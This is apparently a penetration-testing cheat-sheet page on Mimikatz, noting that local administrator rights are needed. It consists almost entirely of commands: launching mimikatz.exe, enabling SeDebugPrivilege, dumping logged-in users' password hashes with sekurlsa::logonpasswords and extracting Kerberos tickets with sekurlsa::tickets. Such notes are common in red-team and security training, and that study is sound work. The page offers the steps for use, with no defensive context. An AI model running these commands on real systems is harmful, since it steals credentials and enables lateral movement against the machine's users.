# Mimikatz

{% hint style="danger" %}
need to be a  local administrator
{% endhint %}

### Start mimikatz:

```powershell
.\mimikatz.exe
```

Enable SeDebugPrivilege:

```powershell
privilege::debug
```

### Dump hashes for logged in users

```powershell
sekurlsa::logonpasswords
```

### Extract kerberos tickets

```powershell
sekurlsa::tickets
```

